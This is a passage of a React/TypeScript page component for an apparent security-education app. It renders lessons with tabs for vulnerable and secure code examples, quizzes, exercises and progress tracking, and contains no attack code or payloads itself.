    switch (type) {
      case "vulnerable":
        return <XCircle className="h-4 w-4 text-danger" />;
      case "secure":
        return <CheckCircle className="h-4 w-4 text-success" />;
      default:
        return <Code className="h-4 w-4" />;
    }
  };

  return (
    <Card className={`${getTypeColor()} transition-all duration-300`}>
      <CardHeader className="pb-3">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-2">
            {getTypeIcon()}
            <CardTitle className="text-sm font-medium">{title}</CardTitle>
            <Badge variant={type === "vulnerable" ? "destructive" : type === "secure" ? "default" : "secondary"}>
              {type === "vulnerable" ? "Vulnerable" : type === "secure" ? "Secure" : "Example"}
            </Badge>
          </div>
          <div className="flex items-center gap-2">
            <Button
              variant="ghost"
              size="sm"
              onClick={() => setIsVisible(!isVisible)}
              className="h-6 w-6 p-0"
            >
              {isVisible ? <Eye className="h-3 w-3" /> : <EyeOff className="h-3 w-3" />}
            </Button>
            <Button
              variant="ghost"
              size="sm"
              onClick={copyCode}
              className="h-6 w-6 p-0"
            >
              <Copy className="h-3 w-3" />
            </Button>
          </div>
        </div>
      </CardHeader>
      {isVisible && (
        <CardContent className="pt-0">
          <pre className="text-sm bg-muted/50 rounded-md p-3 overflow-x-auto">
            <code>{code}</code>
          </pre>
          {copied && (
            <div className="mt-2 text-xs text-success flex items-center gap-1">
              <CheckCircle className="h-3 w-3" />
              Code copied to clipboard!
            </div>
          )}
        </CardContent>
      )}
    </Card>
  );
};

const Learn = () => {
  const { category = "fundamentals", level } = useParams();
  const { theme } = useTheme();
  const { t } = useLanguage();
  const [currentSection, setCurrentSection] = useState(0);
  const startTimeRef = useRef<number>(Date.now());
  const intervalRef = useRef<number | null>(null);
  const progressBarRef = useRef<HTMLDivElement>(null);
  
  // Performance monitoring
  const performance = usePerformance('Learn-Component');
  
  // Debounced search for better performance
  const [searchTerm, setSearchTerm] = useState('');
  const debouncedSearchTerm = useDebounce(searchTerm, 300);
  
  // Progress tracking context
  const { 
    initializeLesson, 
    markSectionCompleted, 
    updateTimeSpent, 
    getLessonProgress,
    getCategoryProgress 
  } = useLearnProgressContext();

  // Get current lesson content
  const categoryContent = learnContent[category as keyof typeof learnContent];
  const lessonContent = level ? categoryContent?.[level as keyof typeof categoryContent] : null;
  const currentLessonSection = lessonContent?.sections?.[currentSection];

  // Get progress for current lesson
  const currentLessonProgress = level ? getLessonProgress(category, level) : null;

  // Check if we have interactive content for this lesson
  const hasInteractiveContent = level && interactiveLessons[level];
  const interactiveSections = hasInteractiveContent ? interactiveLessons[level] : [];

  // Initialize lesson progress when component mounts
  useEffect(() => {
    performance.start();
    
    if (level && lessonContent?.sections) {
      initializeLesson(category, level, lessonContent.sections.length);
      
      // Animate progress bar
      if (progressBarRef.current && currentLessonProgress) {
        animateProgress(progressBarRef.current, currentLessonProgress.progressPercentage);
      }
    }
    
    return () => {
      performance.end();
    };
  }, [level, lessonContent?.sections, category, initializeLesson, performance, currentLessonProgress]);

  // Track time spent on lesson
  useEffect(() => {
    if (level) {
      startTimeRef.current = Date.now();
      
      // Update time spent every 30 seconds
      intervalRef.current = setInterval(() => {
        const timeSpent = Math.floor((Date.now() - startTimeRef.current) / 1000);
        if (timeSpent >= 30) {
          updateTimeSpent(category, level, timeSpent);
          startTimeRef.current = Date.now();
        }
      }, 30000);

      return () => {
        // Update final time when leaving
        const timeSpent = Math.floor((Date.now() - startTimeRef.current) / 1000);
        if (timeSpent > 0) {
          updateTimeSpent(category, level, timeSpent);
        }
        if (intervalRef.current) {
          clearInterval(intervalRef.current);
        }
      };
    }
  }, [level, category, updateTimeSpent]);

  // Handle section navigation with progress tracking
  const handleNextSection = () => {
    if (currentLessonSection && level) {
      // Mark current section as completed
      markSectionCompleted(category, level, currentLessonSection.id);
    }
    
    if (currentSection < (lessonContent?.sections.length || 0) - 1) {
      setCurrentSection(prev => prev + 1);
    }
  };

  const handlePreviousSection = () => {
    if (currentSection > 0) {
      setCurrentSection(prev => prev - 1);
    }
  };

  const handleSectionSelect = (sectionIndex: number) => {
    setCurrentSection(sectionIndex);
  };

  // Handle quiz completion
  const handleQuizComplete = (score: number, timeSpent: number) => {
    if (currentLessonSection && level) {
      // Mark section as completed if score >= 70%
      if (score >= 70) {
        markSectionCompleted(category, level, currentLessonSection.id);
      }
      // Track time spent on quiz
      updateTimeSpent(category, level, timeSpent);
    }
  };

  // Handle exercise completion  
  const handleExerciseComplete = (success: boolean, attempts: number, timeSpent: number) => {
    if (currentLessonSection && level) {
      // Mark section as completed if successful
      if (success) {
        markSectionCompleted(category, level, currentLessonSection.id);
      }
      // Track time spent on exercise
      updateTimeSpent(category, level, timeSpent);
    }
  };

  if (!categoryContent) {
    return (
      <>
        <AppSidebar />
        <SidebarInset>
          <Header />
          <main className="flex-1 p-6">
            <div className="flex items-center justify-center h-64">
              <div className="text-center">
                <BookOpen className="h-16 w-16 mx-auto mb-4 text-muted-foreground" />
                <h3 className="text-xl font-semibold">{t("learn.category_not_found")}</h3>
                <p className="text-muted-foreground">{t("learn.category_not_found_desc")}</p>
              </div>
            </div>
          </main>
        </SidebarInset>
      </>
    );
  }

  if (!level) {
    // Show category overview
    return (
      <>
        <AppSidebar />
        <SidebarInset>
          <Header />
          <main className="flex-1 p-6">
            <div className="max-w-6xl mx-auto space-y-6">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-4">
                  <div className="p-3 bg-gradient-cyber rounded-lg shadow-glow">
                    <BookOpen className="h-8 w-8 text-white" />
                  </div>
                  <div>
                    <h1 className="text-3xl font-bold">{t("learn.mode")}</h1>
                    <p className="text-muted-foreground">{t("learn.guided")}</p>
                  </div>
                </div>
                <CommandPalette />
              </div>

              <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-6">
                {Object.entries(categoryContent).map(([key, content]: [string, any]) => (
                  <Card key={key} className="group hover:shadow-cyber transition-all duration-300 hover:-translate-y-1 cursor-pointer">
                    <CardHeader>
                      <div className="flex items-center justify-between">
                        <CardTitle className="text-lg">{content.title}</CardTitle>
                        <ChevronRight className="h-4 w-4 group-hover:translate-x-1 transition-transform" />
                      </div>
                      <p className="text-sm text-muted-foreground">
                        {content.descriptionKey ? t(content.descriptionKey) : content.description}
                      </p>
                    </CardHeader>
                    <CardContent className="space-y-4">
                      <div className="flex items-center justify-between text-sm">
                        <span>{t("learn.progress")}</span>
                        <span className="font-medium">{content.progress}%</span>
                      </div>
                      <Progress value={content.progress} className="h-2" />
                      <div className="flex items-center justify-between text-sm text-muted-foreground">
                        <span>{content.totalLessons} {t("learn.lessons")}</span>
                        <Badge variant="outline">{Math.ceil(content.totalLessons * content.progress / 100)} {t("learn.completed")}</Badge>
                      </div>
                    </CardContent>
                  </Card>
                ))}
              </div>
            </div>
          </main>
        </SidebarInset>
      </>
    );
  }

  return (
    <>
      <AppSidebar />
      <SidebarInset>
        <Header />
        <main className="flex-1 overflow-hidden">
          <div className="h-full flex">
            {/* Learn Navigation Sidebar */}
            <div className="w-80 border-r border-border">
              <LearnSidebar 
                selectedLesson={level}
                onLessonSelect={(lessonId) => {
                  // Navigate to the selected lesson
                  window.location.href = `/learn/${category}/${lessonId}`;
                }}
              />
            </div>
            
            {/* Main Content */}
            <div className="flex-1 overflow-auto">
              <div className="p-6 max-w-4xl mx-auto space-y-6">
                {/* Lesson Header */}
                <div className="flex items-center gap-4">
                  <div className="p-3 bg-gradient-cyber rounded-lg shadow-glow">
                    <Shield className="h-8 w-8 text-white" />
                  </div>
                  <div className="flex-1">
                    <div className="flex items-center justify-between mb-2">
                      <h1 className="text-3xl font-bold">{lessonContent?.title}</h1>
                      {currentLessonProgress && (
                        <div className="flex items-center gap-2">
                          <Badge variant="outline" className="text-sm">
                            {currentLessonProgress.progressPercentage}% Concluído
                          </Badge>
                          {currentLessonProgress.favorite && (
                            <Badge variant="secondary" className="text-sm">
                              ⭐ Favorito
                            </Badge>
                          )}
                        </div>
                      )}
                    </div>
                    <p className="text-muted-foreground mb-3">
                      {lessonContent?.descriptionKey ? t(lessonContent.descriptionKey) : lessonContent?.description}
                    </p>
                    <div className="flex items-center gap-4">
                      <div className="flex items-center gap-2">
                        <Progress 
                          value={currentLessonProgress?.progressPercentage || 0} 
                          className="h-2 w-48" 
                        />
                        <span className="text-sm text-muted-foreground font-medium">
                          {currentLessonProgress?.sectionsCompleted.length || 0} / {lessonContent?.sections.length || 0}
                        </span>
                      </div>
                      {currentLessonProgress && currentLessonProgress.timeSpent > 0 && (
                        <div className="flex items-center gap-1 text-sm text-muted-foreground">
                          <Clock className="h-3 w-3" />
                          <span>{Math.floor(currentLessonProgress.timeSpent / 60)}min</span>
                        </div>
                      )}
                    </div>
                  </div>
                </div>

                {/* Current Section Content */}
                {currentLessonSection && (
                  <Card className="border-primary/20">
                    <CardHeader>
                      <CardTitle className="flex items-center gap-2">
                        <Target className="h-5 w-5" />
                        {currentLessonSection.title}
                        {/* Section Type Badge */}
                        <Badge variant="outline" className="ml-2">
                          {currentLessonSection.type}
                        </Badge>
                      </CardTitle>
                    </CardHeader>
                    <CardContent className="space-y-6">
                      {/* Theory Section */}
                      {currentLessonSection.content?.theory && (
                        <Alert className="border-info bg-info/5">
                          <Info className="h-4 w-4" />
                          <AlertDescription className="text-base">
                            {currentLessonSection.content.theory}
                          </AlertDescription>
                        </Alert>
                      )}

                      {/* Key Points */}
                      {currentLessonSection.content?.keyPoints && (
                        <div className="space-y-2">
                          <h4 className="font-semibold flex items-center gap-2">
                            <Lightbulb className="h-4 w-4 text-warning" />
                            {t("learn.key_points")}
                          </h4>
                          <ul className="space-y-1 ml-6">
                            {currentLessonSection.content.keyPoints.map((point: string, index: number) => (
                              <li key={index} className="text-sm text-muted-foreground list-disc">
                                {point}
                              </li>
                            ))}
                          </ul>
                        </div>
                      )}

                      {/* Code Examples */}
                      {currentLessonSection.content?.vulnerability && (
                        <div className="space-y-4">
                          <Separator />
                          <h4 className="font-semibold text-lg">{t("learn.code_examples")}</h4>
                          
                          <Tabs defaultValue="vulnerable" className="w-full">
                            <TabsList className="grid w-full grid-cols-2">
                              <TabsTrigger value="vulnerable" className="flex items-center gap-2">
                                <Lock className="h-4 w-4" />
                                {t("learn.vulnerable_code")}
                              </TabsTrigger>
                              <TabsTrigger value="secure" className="flex items-center gap-2">
                                <Unlock className="h-4 w-4" />
                                {t("learn.secure_code")}
                              </TabsTrigger>
                            </TabsList>
                            
                            <TabsContent value="vulnerable" className="space-y-4">
                              <CodeBlock
                                code={currentLessonSection.content.vulnerability.code}
                                title={t("learn.vulnerable_implementation")}
                                type="vulnerable"
                              />
                              <Alert className="border-danger bg-danger/5">
                                <AlertTriangle className="h-4 w-4" />
                                <AlertDescription>
                                  <strong>{t("learn.why_vulnerable")}</strong> {currentLessonSection.content.vulnerability.explanation}
                                </AlertDescription>
                              </Alert>
                            </TabsContent>

                            <TabsContent value="secure" className="space-y-4">
                              <CodeBlock
                                code={currentLessonSection.content.secure.code}
                                title={t("learn.secure_implementation")}
                                type="secure"
                              />
                              <Alert className="border-success bg-success/5">
                                <CheckCircle className="h-4 w-4" />
                                <AlertDescription>
                                  <strong>{t("learn.why_secure")}</strong> {currentLessonSection.content.secure.explanation}
                                </AlertDescription>
                              </Alert>
                            </TabsContent>
                          </Tabs>
                        </div>
                      )}

                      {/* Prevention Tips */}
                      {currentLessonSection.content?.prevention && (
                        <div className="space-y-2">
                          <h4 className="font-semibold flex items-center gap-2">
                            <Shield className="h-4 w-4 text-success" />
                            {t("learn.prevention_strategies")}
                          </h4>
                          <ul className="space-y-1 ml-6">
                            {currentLessonSection.content.prevention.map((tip: string, index: number) => (
                              <li key={index} className="text-sm text-muted-foreground list-disc">
                                {tip}
                              </li>
                            ))}
                          </ul>
                        </div>
                      )}
                    </CardContent>
                  </Card>
                )}

                {/* Interactive Content */}
                {hasInteractiveContent && interactiveSections.length > 0 && (
                  <Card className="border-primary/20 bg-gradient-to-r from-blue-50 to-cyan-50 dark:from-blue-900/20 dark:to-cyan-900/20">
                    <CardHeader>
                      <CardTitle className="flex items-center gap-2">
                        <Zap className="h-5 w-5 text-blue-600" />
                        Conteúdo Interativo
                        <Badge variant="default" className="bg-blue-600">
                          {interactiveSections.length} atividade{interactiveSections.length > 1 ? 's' : ''}
                        </Badge>
                      </CardTitle>
                    </CardHeader>
                    <CardContent>
                      <div className="space-y-6">
                        {interactiveSections.map((section, index) => (
                          <div key={section.id} className="space-y-4">
                            {section.type === 'quiz' && section.quiz && (
                              <LazyInteractiveContent type="quiz">
                                <Suspense fallback={
                                  <div className="flex items-center justify-center p-8">
                                    <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-primary"></div>
                                  </div>
                                }>
                                  <QuizComponent
                                    questions={section.quiz}
                                    title={section.title}
                                    onComplete={handleQuizComplete}
                                    allowRetake={true}
                                  />
                                </Suspense>
                              </LazyInteractiveContent>
                            )}

                            {section.type === 'exercise' && section.exercise && (
                              <LazyInteractiveContent type="exercise">
                                <Suspense fallback={
                                  <div className="flex items-center justify-center p-8">
                                    <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-primary"></div>
                                  </div>
                                }>
                                  <CodeExerciseComponent
                                    exercise={section.exercise}
                                    onComplete={handleExerciseComplete}
                                  />
                                </Suspense>
                              </LazyInteractiveContent>
                            )}

                            {index < interactiveSections.length - 1 && <Separator />}
                          </div>
                        ))}
                      </div>
                    </CardContent>
                  </Card>
                )}

                {/* Navigation */}
                <div className="flex justify-between items-center pt-6">
                  <Button 
                    variant="outline" 
                    disabled={currentSection === 0}
                    onClick={handlePreviousSection}
                  >
                    {t("learn.previous_section")}
                  </Button>
                  
                  <div className="flex items-center gap-2">
                    {lessonContent?.sections.map((section, index) => {
                      const isCompleted = currentLessonProgress?.sectionsCompleted.includes(section.id) || false;
                      return (
                        <div
                          key={index}
                          className={`w-2 h-2 rounded-full cursor-pointer ${
                            index === currentSection ? "bg-primary" : 
                            isCompleted ? "bg-success" : "bg-muted"
                          }`}
                          onClick={() => handleSectionSelect(index)}
                        />
                      );
                    })}
                  </div>

                  <Button 
                    disabled={currentSection === (lessonContent?.sections.length || 0) - 1}
                    onClick={handleNextSection}
                    className="bg-gradient-cyber"
                  >
                    {currentSection === (lessonContent?.sections.length || 0) - 1 
                      ? t("learn.complete_lesson")
                      : t("learn.next_section")
                    }
                    <ChevronRight className="ml-2 h-4 w-4" />
                  </Button>
                </div>
              </div>
            </div>

            {/* Lesson Navigation Sidebar */}
            <div className="w-80 border-l border-border bg-muted/5">
              <ScrollArea className="h-full">
                <div className="p-4 space-y-4">
                  <h3 className="font-semibold">{t("learn.lesson_sections")}</h3>
                  
                  <div className="space-y-2">
                    {lessonContent?.sections.map((section, index) => {
                      const isCompleted = currentLessonProgress?.sectionsCompleted.includes(section.id) || false;
                      const isCurrent = index === currentSection;
                      
                      return (
                        <Button
                          key={section.id}
                          variant={isCurrent ? "default" : "ghost"}
                          className="w-full justify-start text-left h-auto p-3"
                          onClick={() => handleSectionSelect(index)}
                        >
                          <div className="flex items-start gap-3">
                            <div className={`w-6 h-6 rounded-full flex items-center justify-center text-xs font-bold ${
                              isCompleted ? "bg-success text-success-foreground" :
                              isCurrent ? "bg-primary text-primary-foreground" :
                              "bg-muted text-muted-foreground"
                            }`}>
                              {isCompleted ? <CheckCircle className="h-3 w-3" /> : index + 1}
                            </div>
                            <div className="flex-1 min-w-0">
                              <p className="text-sm font-medium truncate">{section.title}</p>
                              <div className="flex items-center gap-2 mt-1">
                                <Badge variant="outline" className="text-xs">
                                  {section.type}
                                </Badge>
                                {isCompleted && (
                                  <Badge variant="secondary" className="text-xs">
                                    Concluído
                                  </Badge>
                                )}
                              </div>
                            </div>
                          </div>
                        </Button>
                      );
                    })}
                  </div>
                </div>
              </ScrollArea>
            </div>
          </div>
        </main>
      </SidebarInset>
    </>
  );
};

export default Learn;